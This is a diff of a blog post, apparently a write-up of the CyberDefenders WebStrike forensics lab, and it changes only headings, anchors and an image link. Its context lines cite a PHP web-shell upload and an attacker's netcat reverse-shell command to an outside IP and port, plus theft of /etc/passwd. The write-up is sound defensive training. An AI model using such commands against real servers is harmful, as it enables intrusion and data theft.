@@ -6,7 +6,7 @@ categories: ["Practice", "SOC Analyst Tier 1", "Level 1"]
 tags: ["Network Forensics", "Initial Access", "Execution", "Persistence", "Command and Control", "Exfiltration", "Wireshark", "CyberDefenders"]
 ---
 # First Lab: WebStrike at CyberDefenders
-## Contents
+## Table of Contents
 - [First Impressions](#first-impressions)
 - [Lab Setup and Tools Used](#lab-setup-and-tools-used)
 - [Q1: Attack Origin — Tianjin, China](#q1-attack-origin--tianjin-china)
@@ -38,7 +38,7 @@ I went with Wireshark cause I had previous experience with it.
 
 ---
 
-## Q1: Attack Origin - Tianjin, China
+## Q1: Attack Origin - Tianjin, China {#q1-attack-origin--tianjin-china}
 
 **Approach:** Let's start investigating. My thought process was:
 1. I need to identify the suspicious connection
@@ -52,7 +52,7 @@ So, I started by:
 
 I followed the HTTP stream and got this:
 
-![Wireshark stream: POST request to upload image.php rejected due to invalid file format.](2025-07-26-webstrike-lab-attachments/image.png)
+![Wireshark stream: POST request to upload image.php rejected due to invalid file format.](https://github.com/ce-omarbadawy/ce-omarbadawy/blob/main/_posts/2025-07-26-webstrike-lab-attachments/image.png?raw=true)
 
 Nice. A failed upload, but it gave up key info: the attacker tried to upload image.php.
 
@@ -63,7 +63,7 @@ Pasted it into an IP Geolocation tool outside the lab.
 
 ---
 
-## Q2: Attacker User-Agent (Linux Firefox)
+## Q2: Attacker User-Agent (Linux Firefox) {#q2-attacker-user-agent-linux-firefox}
 
 Already had it from above:
 **Answer:** User-Agent ✅
@@ -73,7 +73,7 @@ Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
 
 ---
 
-### Q3: Malicious File Uploaded — image.jpg.php
+### Q3: Malicious File Uploaded — image.jpg.php {#q3-malicious-file-uploaded--imagejpgphp}
 
 **Approach:** Using the exact approach of Q1. shows the payload in that HTTP POST.
 
@@ -150,7 +150,7 @@ Let's unwrap it:
 
 ---
 
-### Q4: Upload Directory Exposed - /reviews/uploads/
+### Q4: Upload Directory Exposed - /reviews/uploads/ {#q4-upload-directory-exposed--reviewsuploads}
 
 **Approach:** Here we are looking for the **web-accessible path** (the URL directory), not the literal `/var/www/html/` backend path., I filtered with:
 
@@ -168,7 +168,7 @@ GET /reviews/uploads/image.jpg.php HTTP/1.1
 
 ---
 
-### Q5: Reverse Shell Target Port - 8080
+### Q5: Reverse Shell Target Port - 8080 {#q5-reverse-shell-target-port--8080}
 
 It's in the payload:
 
@@ -180,7 +180,7 @@ nc 117.11.88.124 8080
 
 ---
 
-### Q6: File Exfiltrated - /etc/passwd
+### Q6: File Exfiltrated - /etc/passwd {#q6-file-exfiltrated--etcpasswd}
 
 **Approach:** I'm thinking, I'm trying to find a **GET**, **POST**, or **reverse shell command** where the attacker tried to `cat`, `scp`, `nc`, or `curl` a sensitive file. Time to follow the shell session. I filtered by:
 
